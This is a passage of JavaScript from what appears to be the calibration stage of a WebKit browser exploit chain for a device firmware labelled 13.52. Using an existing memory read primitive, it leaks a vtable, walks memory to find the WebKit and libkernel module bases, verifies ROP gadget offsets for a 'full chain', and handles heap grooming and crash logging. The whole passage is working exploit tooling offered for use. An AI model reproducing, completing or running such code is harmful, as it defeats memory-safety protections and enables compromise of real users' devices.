        nativeFn = captureNativeFn(p, tableOff);
        if (!nativeFn) nativeFn = loadNativeFnOverride();
        if (!nativeFn) throw new Error("nativeFn capture failed");

        syncBasesLikeRw();

        scanIndex = 0;
        scanList = [];
        try {
            sessionStorage.removeItem(SS_PROBE_I);
            sessionStorage.removeItem(SS_PROBE_LIST);
            sessionStorage.removeItem(SS_FIND_BASE_I);
            sessionStorage.removeItem(SS_VTABLE_FIND_I);
            sessionStorage.removeItem(SS_VTABLE_PTR);
        } catch (_) { }

        ready = true;
        logNativeFnInfo(nativeFn);
        manualBase = loadManualBaseOverride();
        if (manualBase) {
            if (baseIn) baseIn.value = ptrNum(manualBase).toString(16);
            mark("CAL-BASE-LOAD", "manual base=" + manualBase + " (expm1 field unchanged)");
        }

        if (params.get("trust") === "1" || params.get("assume") === "1") {
            runAssumeTest(true);
            return;
        }

        mark("HINT-CAL", "tap 2e once — vtable leak + ext→lk auto (same base as index_rw)");
        prefillSuggestedExpm1(nativeFn, tableOff);

        const pre = parseExpm1(params.get("expm1"));
        if (pre > 0 && expm1In) expm1In.value = pre.toString(16);

        updateResultPanel();

        if (AUTO_VTABLE_WALK && !manualBase) {
            mark("AUTO", "2e vtable walk starting…");
            await walkVtableForBase();
            await freeCalMemory();
        } else {
            mark("NEXT", "tap 2e once (vtable + ext→lk) OR set base+expm1 then 4b Accept");
            if (manualBase || params.get("base"))
                await freeCalMemory();
            state("primitive OK — 2e vtable or set base", "ok");
        }
        try { if (expm1In) expm1In.focus(); } catch (_) { }
        if (calBarEl && calBarEl.scrollIntoView)
            try { calBarEl.scrollIntoView(false); } catch (_) { }
    } catch (err) {
        state("failed: " + err.message, "bad");
        mark("ERROR", err.stack || err.message);
    } finally {
        busy = false;
        setUi();
    }
}

async function runScanStep(mode) {
    if (busy || !ready || !window.p || !nativeFn) return;
    busy = true;
    setUi();
    preCalTrim();

    if (scanMode !== mode || scanList.length === 0) rebuildScanList(mode);
    const key = mode === "lite" ? "wk-cal-lite-i" : "wk-cal-wide-i";

    try {
        if (scanIndex >= scanList.length) {
            mark("CAL-FAIL", mode + " scan exhausted (" + scanList.length + " tries)");
            const guess = suggestedExpm1(nativeFn, tableOff);
            if (guess > 0) {
                if (expm1In) expm1In.value = guess.toString(16);
                mark("CAL-GUESS", "expm1=0x" + guess.toString(16) + " base="
                    + nativeFn.sub32(guess));
            }
            mark("HINT", "scan miss is OK on 13.52 — tap Set expm1 (0 reads), skip lite scan");
            mark("HINT", "then Verify all for module check (optional)");
            state("scan done — use Set expm1", "warn");
            return;
        }

        const delta = scanList[scanIndex];
        mark("CAL-TRY", (scanIndex + 1) + "/" + scanList.length
            + " 0x" + delta.toString(16) + " (1 read)");

        await new Promise(r => setTimeout(r, 64));

        const hit = tryElfOnce(window.p, nativeFn, delta);
        scanIndex++;
        try { sessionStorage.setItem(key, String(scanIndex)); } catch (_) { }

        if (!hit) {
            mark("ELF-MISS", "0x" + delta.toString(16));
            state(mode + " " + scanIndex + "/" + scanList.length + " — tap again", "warn");
            return;
        }

        try {
            sessionStorage.setItem(SS_CANDIDATE, String(hit.delta));
            sessionStorage.removeItem(key);
        } catch (_) { }
        clearVerifyProgress();
        applyElfHit(hit.delta, hit.base);
        mark("CAL-MORE", "tap Verify all OR Assume if skipping verify");
        state("ELF hit — Verify or Assume", "ok");
    } finally {
        busy = false;
        setUi();
    }
}

function runSetExpm1() {
    if (busy || !ready || !nativeFn) return;
    preCalTrim();
    const delta = parseExpm1(expm1In && expm1In.value);
    if (!(delta > 0)) {
        mark("CAL-FAIL", "bad expm1 hex");
        state("invalid expm1", "bad");
        return;
    }
    manualBase = null;
    try { sessionStorage.removeItem(SS_MANUAL_BASE); } catch (_) { }
    const base = nativeFn.sub32(delta);
    const base2 = baseFromDelta(nativeFn, delta);
    try { sessionStorage.setItem(SS_CANDIDATE, String(delta)); } catch (_) { }
    if (baseIn && base2) baseIn.value = ptrNum(base2).toString(16);
    clearVerifyProgress();
    updateResultPanel();
    mark("CAL-SET", "expm1=0x" + delta.toString(16) + " base=" + base2 + " (0 reads)");
    if (base2 && base && (base2.low !== base.low || base2.hi !== base.hi))
        mark("CAL-NOTE", "sub32 base=" + base + " ptr base=" + base2);
    mark("HINT", "tap Probe ELF if Verify all fails on this delta");
    state("expm1 set (0 reads)", "ok");
}

function runSetBase() {
    if (busy || !ready || !nativeFn) return;
    preCalTrim();
    const base = parseAddr(baseIn && baseIn.value);
    if (!base) {
        mark("CAL-FAIL", "bad base hex — use e.g. 8325b0000 or 0x8325b0000");
        state("invalid base", "bad");
        return;
    }
    if (!alignedWebkitBase(base)) {
        mark("CAL-WARN", "base=" + base + " not 0x4000-aligned — verify anyway");
    }
    manualBase = base;
    try {
        sessionStorage.setItem(SS_MANUAL_BASE, String(base));
    } catch (_) { }

    clearVerifyProgress();
    updateResultPanel();
    mark("CAL-SET-BASE", "base=" + base + " (manual, 0 reads — expm1 unchanged)");
    mark("HINT", "tap Assume expm1 OR Verify all (uses this base if Set base was last)");
    state("base set (0 reads)", "ok");
}

function runAssumeTest(fromStart) {
    if (!fromStart) {
        if (busy || !ready || !nativeFn) return;
        preCalTrim();
    }
    const delta = parseExpm1(expm1In && expm1In.value) || ASSUMED_EXPM1;
    if (!(delta > 0)) {
        mark("CAL-FAIL", "bad expm1");
        state("invalid expm1", "bad");
        return;
    }
    const base = manualBase || baseFromDelta(nativeFn, delta);
    if (!base) {
        mark("CAL-FAIL", "cannot compute base");
        return;
    }
    if (expm1In) expm1In.value = delta.toString(16);
    if (baseIn) baseIn.value = ptrNum(base).toString(16);
    try { sessionStorage.setItem(SS_CANDIDATE, delta.toString(16)); } catch (_) { }

    if (window.p) {
        const magic = read4p(window.p, base);
        mark("CAL-ELF-PEEK", "read4@base=" + base + " got=" + fmtMagic(magic)
            + " (want 0x464c457f at module start)");
        if (magic === ELF_MAGIC) {
            mark("CAL-ELF-PEEK", "ELF magic OK — 0x2582880 matches this nativeFn");
        } else if (isBadRead(magic)) {
            mark("CAL-WARN", "got " + fmtMagic(magic) + " at base — address wrong/unmapped");
            mark("HINT", "2582880 not confirmed — tap 2d Find base (walks back from nativeFn)");
        } else {
            mark("CAL-WARN", "got " + fmtMagic(magic) + " — not ELF, expm1 likely wrong");
        }
        applyCalibration(delta, base, null, 0, { assumed: true, elfPeek: magic });
    } else {
        applyCalibration(delta, base, null, 0, { assumed: true, elfPeek: null });
    }
    mark("HINT", "offsets live — use index_rw.html to peek webkitBase, or paste JSON");
    state("CAL-OK assumed — ready to test", "ok");
    setUi();
}

async function walkOneAnchorChunk(p, anchor, label, startStep, chunkSteps, backward, silentCont) {
    const maxSteps = backward ? FIND_BASE_MAX_STEPS : FIND_FWD_MAX_STEPS;
    let bad = 0;
    let mapped = 0;
    let lastMagic = null;
    const endStep = Math.min(startStep + chunkSteps, maxSteps);
    const tag = backward ? "back" : "fwd";

    for (let step = startStep; step < endStep; step++) {
        const page = walkPageFrom(anchor, step, backward);
        const probes = step === 0 ? [anchor, page].filter(Boolean) : [page].filter(Boolean);
        for (let pi = 0; pi < probes.length; pi++) {
            const base = probes[pi];
            const kind = classifyModulePage(p, base);
            const w0 = read4p(p, base);
            if (isBadRead(w0)) bad++;
            else mapped++;
            lastMagic = w0;
            if (kind) {
                const resolved = resolveModuleBase(p, base, kind);
                mark("MODULE-HIT", label + " " + tag + " base=" + resolved);
                return { hit: resolved, nextStep: step + 1, done: true };
            }
        }
        if ((step + 1) % 16 === 0)
            await new Promise(r => setTimeout(r, 0));
    }

    if (endStep >= maxSteps) {
        mark("WALK-MISS", label + " exhausted " + tag + " bad=" + bad + " mapped=" + mapped
            + " last=" + fmtMagic(lastMagic));
        return { hit: null, nextStep: endStep, done: true };
    }
    if (!silentCont)
        mark("WALK-CONT", label + " " + tag + " " + endStep + "/" + maxSteps
            + " — tap 2e again");
    return { hit: null, nextStep: endStep, done: false };
}

async function runExtLkAutoScan(p, hits, best, webkitBase, off) {
    const slots = VTABLE_2E_FULL ? VTABLE_EXT_SLOTS : VTABLE_EXT_SLOTS_LITE;
    const scanHits = VTABLE_2E_FULL ? hits : hits.slice(0, 1);
    const chainExt = await collectExtPtrsFromVtableHits(p, scanHits, webkitBase, {
        slots: slots,
        yieldEvery: 8,
    });
    mark("LK-EXT-SCAN", "chain ext ptrs=" + chainExt.length
        + " slots=" + slots + " chains=" + scanHits.length);

    let liveEntries = [];
    if (chainExt.length < 2 && !VTABLE_2E_FULL) {
        await yieldCal(32);
        const live = collectLiveVtableExtPtrs(p, webkitBase, off, {
            carrier: carrierRef,
            retain: calRetain,
            vtableEntries: slots,
            cellMax: 1,
            noFresh: true,
        });
        liveEntries = live.entries || [];
        mark("LK-EXT-SCAN", "live add-on n=" + liveEntries.length);
    }
    let sessionEntries = [];
    try {
        const raw = sessionStorage.getItem("wk-cal-ext-ptrs");
        if (raw) sessionEntries = JSON.parse(raw);
    } catch (_) { }
    const merged = [];
    const seen = new Set();
    function addEntry(e) {
        const hex = (e.hex || e.ptr || "").replace(/^0x/i, "").toLowerCase();
        if (!hex || seen.has(hex)) return;
        seen.add(hex);
        merged.push({ label: e.label || "ext", hex: hex, ptr: hex, code: e.code || null });
    }
    for (let i = 0; i < chainExt.length; i++) addEntry(chainExt[i]);
    for (let i = 0; i < liveEntries.length; i++) addEntry(liveEntries[i]);
    for (let j = 0; j < sessionEntries.length; j++) addEntry(sessionEntries[j]);

    await yieldCal(32);
    mark("LK-EXT-SCAN", "merged n=" + merged.length + " — 0-read vote…");
    for (let ci = 0; ci < merged.length && ci < 10; ci++) {
        mark("LK-EXT-CAND", merged[ci].label + " " + merged[ci].hex
            + (merged[ci].code ? " " + merged[ci].code : ""));
    }

    if (!merged.length) return { ok: false, error: "no ext ptrs" };

    const hit = resolveLibkernelFromExtList(p, webkitBase, off, merged, {
        minVotes: 2,
        minDistinctFn: 2,
        allowSinglePriRva: true,
    });
    if (hit.ok && hit.lk) {
        saveLibkernelSession(hit.lk, hit.iatRva || null);
        const expm1 = off.wk_expm1_builtin || 0;
        if (expm1 > 0)
            applyCalibration(expm1, webkitBase, hit.lk, 0, { accept: true });
        if (hit.fnRefs && hit.fnRefs.length) {
            for (let fi = 0; fi < hit.fnRefs.length && fi < 4; fi++) {
                const fr = hit.fnRefs[fi];
                mark("LK-PTR-OK", fr.label + " fn=0x" + fr.hex + " via " + fr.key);
            }
        }
        mark("LK-OK", hit.lk + " (" + hit.method + "/" + hit.via + ") reads=0");
        mark("HINT", "index_rw → Accept lk → reload → Arm getpid");
        state("libkernel auto OK (0-read)", "ok");
        return { ok: true, lk: hit.lk };
    }
    mark("LK-EXT-MISS", hit.error || "no lk consensus");
    if (hit.hint)
        mark("LK-HINT", hit.hint);
    if (hit.ptrDiag && hit.ptrDiag.length) {
        let shown = 0;
        for (let pi = 0; pi < hit.ptrDiag.length && shown < 12; pi++) {
            const line = formatExtPtrDiagLine(hit.ptrDiag[pi]);
            if (!line) continue;
            mark(hit.ptrDiag[pi].skipped ? "LK-PTR-SKIP" : "LK-PTR", line);
            shown++;
        }
    }
    if (hit.zeroRank && hit.zeroRank.length) {
        for (let ri = 0; ri < hit.zeroRank.length && ri < 4; ri++) {
            const r = hit.zeroRank[ri];
            let refLine = "";
            if (r.fnRefs && r.fnRefs.length) {
                refLine = " refs=" + r.fnRefs.map(function (fr) {
                    return fr.label + ":0x" + fr.hex + "/" + fr.key;
                }).join(" ");
            } else if (r.refs && r.refs.length) {
                refLine = " refs=" + r.refs.join(" ");
            }
            mark("LK-ZERO-RANK", (ri + 1) + " lk=" + String(r.lk)
                + " fn=" + (r.distinctFn != null ? r.distinctFn : "?")
                + " cross=" + (r.crossRva != null ? r.crossRva : 0)
                + " votes=" + r.count + refLine);
        }
    }
    return { ok: false, hit: hit };
}

async function walkVtableForBase() {
    const p = window.p;
    if (!carrierRef) {
        state("no carrier", "bad");
        return false;
    }

    mark("2E-START", VTABLE_2E_FULL ? "full scan (OOM risk)" : "lite scan slots=" + VTABLE_EXT_SLOTS_LITE);
    await yieldCal(48);

    walkQuiet = true;
    const hits = discoverTextareaVtableChains(p, carrierRef, { lite: !VTABLE_2E_FULL });
    walkQuiet = false;

    if (!hits.length) {
        mark("VTABLE-FAIL", "no vtable chain — re-run Start (try ?g=512 groom)");
        state("vtable leak failed", "bad");
        return false;
    }

    await yieldCal(32);

    hits.sort(function (a, b) { return (b.score || 0) - (a.score || 0); });
    const best = hits[0];
    vtableHit = best;
    vtablePtr = best.vtable;
    try { sessionStorage.setItem(SS_VTABLE_PTR, String(best.vtable)); } catch (_) { }

    mark("VTABLE-OK", best.label + " vtable=" + best.vtable + " chains=" + hits.length);
    const extN = logVtableExtPtrs(p, best, {
        slots: VTABLE_2E_FULL ? VTABLE_EXT_SLOTS : VTABLE_EXT_SLOTS_LITE,
        quiet: true,
    });
    mark("LK-EXT-SCAN", extN + " EXT-PTR from best — lk vote next…");

    await yieldCal(32);

    const synced = syncBasesLikeRw();
    const off = synced.off;
    const webkitBase = synced.webkitBase;
    if (!webkitBase || !off) {
        mark("CAL-FAIL", "no webkit base — set expm1 or run Start first");
        state("no webkit base", "bad");
        return false;
    }

    const lkHit = await runExtLkAutoScan(p, hits, best, webkitBase, off);
    if (lkHit.ok) return true;

    mark("CAL-FAIL", "ext→lk miss — base=" + webkitBase + " (nativeFn-expm1, same as index_rw)");
    mark("HINT", "index_rw → Scan ext→lk, or groom + retry 2e");
    state("lk miss — base synced to index_rw", "warn");
    return false;
}

async function runFindBaseVtable() {
    if (busy || !ready || !window.p || !carrierRef) return;
    busy = true;
    setUi();
    preCalTrim();
    try {
        await walkVtableForBase();
    } finally {
        busy = false;
        setUi();
    }
}

async function runFindBase() {
    if (busy || !ready || !window.p || !nativeFn) return;
    busy = true;
    setUi();
    preCalTrim();

    let step = 0;
    try { step = parseInt(sessionStorage.getItem(SS_FIND_BASE_I) || "0", 10) || 0; } catch (_) { }

    if (step >= FIND_BASE_MAX_STEPS) {
        mark("CAL-FAIL", "find-base exhausted " + FIND_BASE_MAX_STEPS + " pages back");
        mark("HINT", "nativeFn may be wrong — check CAL-PATH-TRY lines; try ?pair=1 on Start");
        state("find-base done — no ELF", "bad");
        busy = false;
        setUi();
        return;
    }

    const base = findBaseWalkAddr(nativeFn, step);
    if (!base) {
        mark("CAL-FAIL", "find-base walked past valid range");
        state("find-base stopped", "bad");
        busy = false;
        setUi();
        return;
    }

    const delta = impliedExpm1FromBase(nativeFn, base);
    mark("FIND-BASE", (step + 1) + "/" + FIND_BASE_MAX_STEPS
        + " base=" + base + " expm1=0x" + delta.toString(16) + " (1 read)");

    try {
        await new Promise(r => setTimeout(r, 64));
        const magic = read4p(window.p, base);
        step++;
        try { sessionStorage.setItem(SS_FIND_BASE_I, String(step)); } catch (_) { }

        if (magic !== ELF_MAGIC) {
            const kind = classifyModulePage(p, base);
            if (kind) {
                const resolved = resolveModuleBase(p, base, kind);
                try { sessionStorage.removeItem(SS_FIND_BASE_I); } catch (_) { }
                applyBaseFound(resolved, "nativeFn-walk/" + kind);
                mark("NEXT", "Verify all to confirm gadgets");
                state("base found via nativeFn walk", "ok");
                return;
            }
            const tag = isBadRead(magic) ? " (bad/unmapped)" : "";
            mark("ELF-MISS", fmtMagic(magic) + " @ " + base + tag);
            mark("HINT", "0xcccccccc = wrong address — try 2e vtable walk");
            state("find-base " + step + "/" + FIND_BASE_MAX_STEPS + " — tap again", "warn");
            return;
        }

        try { sessionStorage.removeItem(SS_FIND_BASE_I); } catch (_) { }
        applyBaseFound(base, "nativeFn-walk");
        mark("NEXT", "Verify all to confirm gadgets");
        state("ELF found via walk-back", "ok");
    } finally {
        busy = false;
        setUi();
    }
}

async function runProbeElf() {
    if (busy || !ready || !window.p || !nativeFn) return;
    busy = true;
    setUi();
    preCalTrim();

    let list = [];
    try {
        const n = parseInt(sessionStorage.getItem(SS_PROBE_LIST) || "0", 10) || 0;
        if (n > 0) list = probeAlignedDeltas(nativeFn).slice(0, n);
    } catch (_) { }
    if (list.length === 0) {
        list = probeAlignedDeltas(nativeFn);
        try { sessionStorage.setItem(SS_PROBE_LIST, String(list.length)); } catch (_) { }
    }

    let i = 0;
    try { i = parseInt(sessionStorage.getItem(SS_PROBE_I) || "0", 10) || 0; } catch (_) { }

    if (i >= list.length) {
        mark("CAL-FAIL", "probe exhausted " + list.length + " aligned deltas");
        mark("HINT", "try 2d Find base (walk back from nativeFn) or ?min=0x1e00000&max=0x2c00000");
        state("probe done — no ELF", "bad");
        busy = false;
        setUi();
        return;
    }

    const delta = list[i];
    const base = baseFromDelta(nativeFn, delta);
    mark("PROBE-TRY", (i + 1) + "/" + list.length + " expm1=0x" + delta.toString(16)
        + " base=" + base + " (1 read)");

    try {
        await new Promise(r => setTimeout(r, 64));
        const magic = read4p(window.p, base);
        i++;
        try { sessionStorage.setItem(SS_PROBE_I, String(i)); } catch (_) { }

        if (magic !== ELF_MAGIC) {
            mark("ELF-MISS", fmtMagic(magic) + " @ " + base
                + (magic === 0xcccccccc ? " (unmapped/wrong addr)" : ""));
            state("probe " + i + "/" + list.length + " — tap Probe ELF again", "warn");
            return;
        }

        applyElfHit(delta, base);
        mark("NEXT", "tap Verify all or Assume");
        state("ELF found — Verify or Assume", "ok");
    } finally {
        busy = false;
        setUi();
    }
}

async function runVerifyAll() {
    if (busy || !ready || !window.p || !nativeFn) return;
    let base = activeBase();
    if (!base) {
        mark("CAL-FAIL", "no base — type expm1 or base, then Set");
        state("need expm1 or base", "bad");
        return;
    }
    const delta = activeDelta();

    busy = true;
    setUi();
    clearVerifyProgress();
    clearLkProgress();

    const p = window.p;
    if (!(delta > 0)) {
        mark("CAL-FAIL", "no expm1 — Set expm1 first");
        state("need expm1 delta", "bad");
        busy = false;
        setUi();
        return;
    }

    state("verify lite…", "warn");

    try {
        await freeCalMemory();

        const baseResult = verifyModuleBaseLite(p, base);
        base = baseResult.base;
        const report = [
            "build=" + BUILD_ID + " (verify-lite)",
            "base=" + base + (delta > 0 ? " expm1=0x" + delta.toString(16) : ""),
            baseResult.line,
        ];

        if (!baseResult.ok) {
            report.push("summary FAIL — bad base");
            markGadgetReport(report);
            mark("HINT", "Set base manually or re-Start vtable walk");
            state("verify fail — bad base", "bad");
            return;
        }

        report.push("--- gadgets ---");
        verifyGadgetOk = 0;
        let anyBad = false;
        for (let gi = 0; gi < GADGET_CHECKS.length; gi++) {
            const row = GADGET_CHECKS[gi];
            const g = checkOneGadget(p, base, row);
            report.push(g.line);
            if (g.ok === true) verifyGadgetOk++;
            else if (g.ok === false) anyBad = true;
            await new Promise(r => setTimeout(r, 32));
        }
        report.push("summary " + verifyGadgetOk + "/" + GADGET_CHECKS.length + " OK");

        await new Promise(r => setTimeout(r, 32));
        const lk = verifyLibkernelOnce(p, base);
        report.push(lk.line);

        markGadgetReport(report);

        if (anyBad && verifyGadgetOk === 0)
            mark("HINT", "13.50 gadget RVAs wrong on 13.52 — tap 4b Scan gadgets, then Verify all");

        if (verifyGadgetOk >= 4) {
            applyCalibration(delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base),
                base, lk.ok ? lk.lkBase : null, verifyGadgetOk);
            if (verifyGadgetOk < 6)
                mark("CAL-WARN", "partial gadgets " + verifyGadgetOk + "/8 — need 6 for full chain");
            state("verify OK " + verifyGadgetOk + "/8", "ok");
        } else {
            mark("CAL-FAIL", "gadgets " + verifyGadgetOk + "/" + GADGET_CHECKS.length
                + " (need ≥4) — tap Scan gadgets");
            state("gadget verify fail", "bad");
        }
    } finally {
        busy = false;
        setUi();
    }
}

/** @deprecated alias — one tap runs full verify */
async function runVerifyStep() {
    return runVerifyAll();
}

function runCopy() {
    const block = lines.find(l => l.startsWith("PASTE-OFFSETS"));
    if (!block) return;
    const json = block.replace(/^PASTE-OFFSETS\s+/, "");
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(json).then(
            () => mark("COPY", "offsets JSON copied"),
            () => mark("COPY", "clipboard failed — copy from log")
        );
    } else {
        mark("COPY", "copy PASTE-OFFSETS line from log");
    }
}

function reportErr(err) {
    const msg = err && err.message ? err.message : String(err);
    state("error: " + msg, "bad");
    mark("ERROR", err && err.stack ? err.stack : msg);
}

function wireClick(el, fn) {
    if (!el) return;
    el.addEventListener("click", function () {
        try {
            const r = fn();
            if (r && typeof r.then === "function")
                r.catch(reportErr);
        } catch (err) {
            reportErr(err);
        }
    });
}

function init() {
    outEl = $("out");
    stateEl = $("state");
    resultEl = $("result");
    nativeFnEl = $("native-fn");
    baseEl = $("webkit-base");
    expm1In = $("expm1-in");
    baseIn = $("base-in");
    btnStart = $("btn-start");
    btnLite = $("btn-lite");
    btnWide = $("btn-wide");
    btnVerify = $("btn-verify");
    btnScanGadgets = $("btn-scan-gadgets");
    btnSetExpm1 = $("btn-set-expm1");
    btnSetBase = $("btn-set-base");
    btnAssume = $("btn-assume");
    btnVerify2 = $("btn-verify-2");
    btnSetExpm12 = $("btn-set-expm1-2");
    btnSetBase2 = $("btn-set-base-2");
    btnProbe = $("btn-probe");
    btnFindBase = $("btn-find-base");
    btnFindBaseVtable = $("btn-find-base-vtable");
    calBarEl = $("cal-bar");
    btnCopy = $("btn-copy");
    btnClear = $("btn-clear");

    if (!outEl || !btnStart) {
        state("UI missing — open via HTTP(S), not file://", "bad");
        return;
    }

    wireClick(btnStart, function () { return runStart(); });
    wireClick(btnLite, function () { return runScanStep("lite"); });
    wireClick(btnWide, function () { return runScanStep("wide"); });
    wireClick(btnVerify, function () { return runVerifyAll(); });
    wireClick(btnVerify2, function () { return runVerifyAll(); });
    wireClick(btnScanGadgets, function () { return runScanGadgets(); });
    wireClick(btnSetExpm1, runSetExpm1);
    wireClick(btnSetExpm12, runSetExpm1);
    wireClick(btnSetBase, runSetBase);
    wireClick(btnSetBase2, runSetBase);
    wireClick(btnAssume, function () { runAssumeTest(false); });
    wireClick(btnProbe, function () { return runProbeElf(); });
    wireClick(btnFindBase, function () { return runFindBase(); });
    wireClick(btnFindBaseVtable, function () { return runFindBaseVtable(); });
    wireClick(btnCopy, runCopy);
    wireClick(btnClear, function () {
        lines.length = 0;
        pinnedLines.length = 0;
        crashLog.clear();
        if (outEl) outEl.textContent = "";
        mark("LOG-CLEAR", "sessionStorage log cleared");
    });

    if (expm1In)
        expm1In.addEventListener("input", function () { updateResultPanel(); });
    if (baseIn)
        baseIn.addEventListener("input", function () { updateResultPanel(); });

    const cached = loadNativeFnOverride();
    if (cached) mark("BOOT", "cached nativeFn " + cached + " (Start refreshes live)");

    const pre = params.get("expm1");
    if (pre && expm1In) expm1In.value = pre.replace(/^0x/i, "");
    else if (expm1In) expm1In.value = ASSUMED_EXPM1.toString(16);

    const preBase = params.get("base");
    if (preBase && baseIn) {
        baseIn.value = preBase.replace(/^0x/i, "");
        manualBase = parseAddr(preBase);
    } else {
        manualBase = loadManualBaseOverride();
        if (manualBase && baseIn) baseIn.value = ptrNum(manualBase).toString(16);
    }

    crashLog.startAutoFlush();
    if (params.get("clearlog") === "1") clearPersistedLog();
    else crashLog.restoreInto(lines);

    mark("BOOT", "build=" + BUILD_ID + " — logs persist across reload/crash");
    mark("BOOT", "index_cal.html — expm1 / vtable for 13.52");
    mark("BOOT", groomBootLine());
    mark("BOOT", "2e lite OOM-safe — ?full=1 for heavy scan; ?vtslots=24 more ext slots");
    wireGroomBar();
    setUi();
    renderOut();
    state("ready — pick groom if needed, then Start", "");
    window.addEventListener("beforeunload", function () {
        if (stateEl) crashLog.persistState(stateEl.textContent, stateEl.className, true);
        crashLog.flushSync();
    });
}

function bootUi() {
    try {
        init();
    } catch (err) {
        reportErr(err);
    }
}

if (document.readyState === "loading")
    document.addEventListener("DOMContentLoaded", bootUi);
else
    bootUi();
